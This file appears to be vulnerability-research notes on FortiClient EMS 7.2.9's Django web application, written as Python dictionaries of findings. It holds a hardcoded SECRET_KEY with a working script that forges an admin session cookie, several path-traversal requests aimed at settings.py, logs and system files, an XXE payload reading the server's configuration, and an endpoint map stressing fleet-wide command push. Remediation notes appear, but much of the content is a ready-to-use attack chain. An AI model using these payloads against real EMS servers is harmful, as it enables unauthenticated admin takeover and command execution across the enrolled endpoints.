"""
FortiClient EMS 7.2.9 -- Django application RE
Source: FortiClientEMS_7.2.9.0981.exe (WiX Burn bootstrapper)
Extraction: CAB at offset 0x7D600 -> MSI a11 (491MB) -> msiextract -> /tmp/ems_contents/
Django app: Program Files/Fortinet/FortiClientEMS/Fcm/
Python: 3.10 (pyc magic 0x6f0d = 3439), compiled 2025-04-08
Build path: C:\\GitLab-Runner\\builds\\temp\\FortiClientEMS\\webserver\\fcm\\
"""

# ---------------------------------------------------------
# Platform identity
# ---------------------------------------------------------
PLATFORM = {
    "product":    "Fortinet FortiClient EMS",
    "version":    "7.2.9.0981",
    "build_date": "2025-04-08",
    "installer":  "FortiClientEMS_7.2.9.0981.exe (WiX Burn bootstrapper)",
    "stack": {
        "web_server": "Apache24",
        "wsgi":       "Django 4.1 (apache_django_wsgi.conf)",
        "python":     "3.10 (CPython, Windows x64)",
        "db":         "SQL Server (pyodbc)",
        "cache":      "Redis",
    },
    "layout": {
        "installdir": "C:\\Program Files\\Fortinet\\FortiClientEMS",
        "fcm_dir":    "Fcm/",
        "settings":   "Fcm/fcm/settings.py",
        "urls":       "Fcm/fcm/urls.pyc",
        "views":      "Fcm/fcm/views.pyc",
        "auth":       "Fcm/fcm/auth/session_auth.pyc, jwt_auth.pyc, cert_chain_auth.pyc",
    },
    "analysis_notes": [
        "pyc files compiled for Python 3.10; decompyle3 v3.9.3 unsupported -- used strings(1) for constant extraction",
        "settings.py ships in plaintext (not compiled); full source readable from extracted MSI",
        "URL surface recovered from urls.pyc via strings extraction of regex patterns",
    ],
}


# ---------------------------------------------------------
# EMS-F1: Hardcoded Django SECRET_KEY + signed-cookie session forgery
# ---------------------------------------------------------
EMS_F1_SECRET_KEY_AUTH_BYPASS = {
    "id":        "EMS-F1",
    "title":     "Hardcoded Django SECRET_KEY enables pre-auth admin session forgery",
    "severity":  "CRITICAL",
    "cvss":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cvss_score": 9.8,
    "cwe":       "CWE-798 (Use of Hard-coded Credentials)",
    "status":    "CONFIRMED -- key present in shipped settings.py; installer rewrite unconfirmed",

    "evidence": {
        "file":          "Fcm/fcm/settings.py:26",
        "session_engine": "django.contrib.sessions.backends.signed_cookies",
        "secret_key":    "69v=0kt6&j$9q-t)yw8g15v&$x3wp(cg4$59$g+fwdot2ygy4r",
        "installer_comment": "# installer rewrites this lines to make it random per-machine",
        "rewrite_status": "No Python rewrite script found in extracted MSI; rewrite is likely a WiX C# custom action (DLL not recoverable from msiextract)",
        "additional_weaknesses": [
            "DEBUG = True",
            "SESSION_COOKIE_HTTPONLY = False -- cookie accessible via JS",
            "SESSION_COOKIE_SECURE = False -- cookie sent over plaintext HTTP",
            "CSRF_COOKIE_SECURE = False",
            "django.contrib.auth commented out of INSTALLED_APPS",
            "django.contrib.auth.middleware.AuthenticationMiddleware commented out of MIDDLEWARE",
        ],
    },

    "mechanism": (
        "Django signed_cookies session engine serializes the entire session dict, "
        "HMAC-signs it with SECRET_KEY (using HMAC-SHA256 via TimestampSigner), "
        "and stores the result client-side in the session cookie. No server-side "
        "session store is consulted. Any party knowing SECRET_KEY can call "
        "django.core.signing.dumps({'user_id': 1, 'user_role': 'admin', 'is_global': True, ...}, "
        "key=SECRET_KEY, salt='django.contrib.sessions.backends.signed_cookies') "
        "and produce a valid session cookie that SessionAuth.check_session accepts."
    ),

    "attack_chain": [
        "Step 1: Obtain SECRET_KEY from shipped installer (default: '69v=0kt6...')",
        "Step 2: Forge session dict with target user_id=1 (superadmin), user_role='admin', is_global=True",
        "Step 3: Sign using django.core.signing.dumps with extracted key",
        "Step 4: Send request to any authenticated /api/v1/ endpoint with forged sessionid cookie",
        "Step 5: SessionAuth.check_session validates HMAC -- passes",
        "Step 6: Full admin API access: device quarantine, policy push, config export, user management",
    ],

    "forge_primitive": """
from django.core.signing import dumps, TimestampSigner
import django.conf
django.conf.settings.configure(
    SECRET_KEY='69v=0kt6&j$9q-t)yw8g15v&$x3wp(cg4$59$g+fwdot2ygy4r',
    SESSION_ENGINE='django.contrib.sessions.backends.signed_cookies',
)
session_data = {
    '_auth_user_id': '1',
    '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend',
    'user_id': 1,
    'user_role': 'admin',
    'is_global': True,
    'vdom': 'root',
    'allowed_vdoms': ['root'],
    'read_only': False,
}
cookie_val = dumps(
    session_data,
    key='69v=0kt6&j$9q-t)yw8g15v&$x3wp(cg4$59$g+fwdot2ygy4r',
    salt='django.contrib.sessions.backends.signed_cookies',
    compress=True,
)
# POST to /api/v1/endpoints/ with Cookie: sessionid=<cookie_val>
""",

    "confidence_notes": [
        "Default key confirmed in shipped settings.py",
        "Installer claims to randomize key at install time via custom action (WiX DLL)",
        "If installer rewrite succeeds: key is unique per install; attack requires key recovery",
        "Key recovery vectors: read settings.py from filesystem (requires local access), "
        "backup exposure, Django DEBUG=True error page leaks, LFI via EMS-F2",
        "Even with unique key: key stored in plaintext settings.py readable by any "
        "Windows user with access to the EMS install directory",
        "SESSION_COOKIE_HTTPONLY = False: XSS-to-session-theft enabled even without key",
    ],

    "remediation": [
        "Replace signed_cookies session engine with database-backed sessions (SESSION_ENGINE = 'django.contrib.sessions.backends.db')",
        "Ensure installer randomizes SECRET_KEY and verify the action runs",
        "Set SESSION_COOKIE_HTTPONLY = True",
        "Set SESSION_COOKIE_SECURE = True",
        "Restrict settings.py filesystem permissions to EMS service account only",
        "Disable DEBUG in production builds",
    ],
}


# ---------------------------------------------------------
# EMS-F2: Path traversal via /content/<path> endpoint
# ---------------------------------------------------------
EMS_F2_CONTENT_PATH_TRAVERSAL = {
    "id":       "EMS-F2",
    "title":    "Path traversal in content endpoint allows file read beyond CONTENT_DIRECTORY",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe":      "CWE-22 (Path Traversal)",
    "status":   "CANDIDATE -- regex confirmed; server-side join+sanitize not confirmed",

    "evidence": {
        "url_pattern":   r"^content/(?P<path>[^\\\s]+)/?$",
        "handler":       "views.py View.content()",
        "base_constant": "CONTENT_DIRECTORY (value not recovered; likely relative to INSTALLDIR or BASE_DIR)",
        "regex_analysis": (
            r"Regex [^\\\s]+ excludes only backslash and whitespace. "
            "Forward slashes, dots, and colons are permitted. "
            r"Pattern matches: '../../../Windows/System32/drivers/etc/hosts', "
            r"'../fcm/settings.py', '../../logs/debug_2025-04-08.log'"
        ),
    },

    "auth_status": (
        "UNKNOWN -- views.pyc shows CONTENT_DIRECTORY imported in views.py alongside session auth; "
        "whether content() is decorated with @prepare_api (requires auth) or served unauthenticated "
        "could not be confirmed from pyc strings alone. "
        "If unauthenticated: pre-auth LFI. If authenticated: chained with EMS-F1 for full exploit."
    ),

    "attack_chain": [
        "Step 1 [authenticated]: Forge admin session via EMS-F1",
        "Step 2: GET /content/../fcm/settings.py",
        "Step 3: Recover live SECRET_KEY from response (if installer changed default)",
        "Step 4: Forge new session with recovered key",
    ],

    "samples": [
        "GET /content/../fcm/settings.py",
        "GET /content/../../logs/api_2025-04-08.log",
        "GET /content/../../../Windows/System32/drivers/etc/hosts",
        "GET /content/../fcm/models/utils/sql_helper.pyc (recover DB connection strings)",
    ],

    "remediation": [
        "Resolve path with os.path.abspath() and assert result starts with CONTENT_DIRECTORY",
        "Use Django's serve() with document_root and ensure path is sanitized before join",
    ],
}


# ---------------------------------------------------------
# EMS-F3: XML import/convert endpoints -- XXE candidate
# ---------------------------------------------------------
EMS_F3_XML_XXE_CANDIDATE = {
    "id":       "EMS-F3",
    "title":    "XML import and convert endpoints are candidates for XXE injection",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe":      "CWE-611 (Improper Restriction of XML External Entity Reference)",
    "status":   "CANDIDATE -- endpoints confirmed in URL surface; parser config not confirmed",

    "endpoints": [
        "^convert/xml/?$",
        "^import/xml/?$",
        "^generate/xml/?$",
        "^download/xml/?$",
        "^get/xml/?$",
        "^default_xml/?$",
    ],

    "rationale": (
        "EMS stores endpoint policies and configurations as XML. "
        "Multiple endpoints accept XML uploads (import/xml) and perform XML conversion (convert/xml). "
        "Django does not configure XML parsers by default; if the controller uses Python's "
        "xml.etree.ElementTree or lxml with default settings, external entities are not disabled. "
        "Successful XXE on an import endpoint would allow reading arbitrary files "
        "from the EMS server filesystem via the SYSTEM entity mechanism."
    ),

    "probe": """
POST /api/v1/import/xml/ HTTP/1.1
Cookie: sessionid=<forged_via_EMS-F1>
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///C:/Program Files/Fortinet/FortiClientEMS/Fcm/fcm/settings.py" >]>
<config><item>&xxe;</item></config>
""",

    "remediation": [
        "Parse XML with defusedxml library or set ElementTree.XMLParser to disallow entities",
        "If using lxml: set resolve_entities=False and no_network=True in XMLParser",
    ],
}


# ---------------------------------------------------------
# EMS-F4: URL attack surface -- high-value endpoints
# ---------------------------------------------------------
EMS_F4_ATTACK_SURFACE = {
    "id":    "EMS-F4",
    "title": "FortiClient EMS 7.2.9 full URL attack surface",

    "extraction_method": "strings(1) on urls.pyc -- regex constants recovered without decompilation",

    "high_value_endpoints": {
        "session_forgery_targets": [
            "/api/v1/endpoints/ -- full endpoint management (quarantine, policy, deregister)",
            "/api/v1/users/ -- user management",
            "/api/v1/admins/ -- admin account management",
            "/api/v1/credentials/update/ -- credential update",
            "/api/v1/certificates/ -- certificate management",
            "/api/v1/server_certificates/ -- server cert management",
            "/api/v1/system/ -- system config",
            "/api/v1/settings/ -- application settings",
        ],
        "command_execution_candidates": [
            "/api/v1/groups/<group_id>/send_command/<command> -- pushes commands to enrolled FortiClient agents",
            "/api/v1/send_command/<command> -- global command push",
            "/api/v1/endpoints/<id>/reset_deployment/ -- confirmed in strings: 'Reset deployment of endpoint'",
        ],
        "file_operation_endpoints": [
            "/content/<path> -- EMS-F2 traversal target",
            "/api/v1/upload/ -- file upload",
            "/api/v1/upload_cert/ -- cert upload",
            "/api/v1/upload_pem -- PEM upload",
            "/api/v1/upload_pkcs12 -- PKCS12 upload",
            "/api/v1/download/ -- file download",
            "/api/v1/download_key/ -- key download",
            "/api/v1/export/ -- data export",
            "/api/v1/diagnostic_log/ -- server diagnostic log access",
            "/api/v1/support_package/ -- support package (likely includes config + logs + secrets)",
        ],
        "xml_endpoints": [
            "/api/v1/import/xml/ -- EMS-F3 XXE target",
            "/api/v1/convert/xml/ -- EMS-F3 XXE target",
            "/api/v1/generate/xml/",
            "/api/v1/download/xml/",
        ],
        "auth_bypass_candidates": [
            "/api/v1/jwt/signin/ -- JWT-based signin (separate auth path from session)",
            "/api/v1/auth_fos/ -- FortiOS auth integration",
            "/api/v1/fabric-authorization/ -- fabric device auth (separate path)",
            "/api/v1/saml/ -- SAML auth flow",
            "/api/v1/cloud/signin -- cloud signin flow",
        ],
        "pre_auth_exposed": [
            "/signin/ -- login page",
            "/favicon.ico",
            "/api/v1/check_session -- session validity check (unauthenticated probe)",
            "/api/v1/init_consts -- application constants (may leak version/config info)",
            "/api/v1/acme/ -- ACME certificate management (may be pre-auth)",
        ],
    },

    "total_url_patterns_recovered": "~200+ unique regex patterns",

    "send_command_analysis": {
        "url": r"^groups/(?P<group_id>\d+)/send_command/(?P<command>",
        "note": (
            "command parameter is URL-captured; in endpoint_controller.pyc strings, "
            "ENDPOINT_COMMANDS is referenced alongside 'quarantined', 'vulnscan' constants -- "
            "commands appear to be validated against an allowlist before dispatch to FortiClient agents. "
            "Command injection on the EMS server itself was NOT confirmed; "
            "these commands are pushed to enrolled endpoints via the OFTP/EMS protocol, not executed locally."
        ),
        "lateral_risk": (
            "Authenticated admin can push quarantine/vulnscan/remediation commands to all enrolled "
            "FortiClient endpoints. Combined with EMS-F1, an unauthenticated attacker gains "
            "fleet-wide endpoint command execution capability."
        ),
    },
}


# ---------------------------------------------------------
# Pending analysis
# ---------------------------------------------------------
PENDING = [
    "Decompile views.py content() to confirm auth requirement and CONTENT_DIRECTORY join logic",
    "Decompile admin_settings_controller.pyc for send_command command validation logic",
    "Confirm if import/xml endpoint uses defusedxml or vulnerable XML parser",
    "Extract DB connection strings from sql_helper.pyc or connection config",
    "Check if /api/v1/init_consts is unauthenticated and leaks version/build info",
    "Analyze certificate upload endpoints for parsing vulnerabilities",
    "Check /api/v1/support_package/ for credential/key inclusion in archive",
    "FortiClient VPN 7.2.10 -- start extraction and RE",
    "FAZ VM64 -- pending flatkc key for encrypted rootfs",
    "FortiGate VM64 -- pending flatkc key",
]
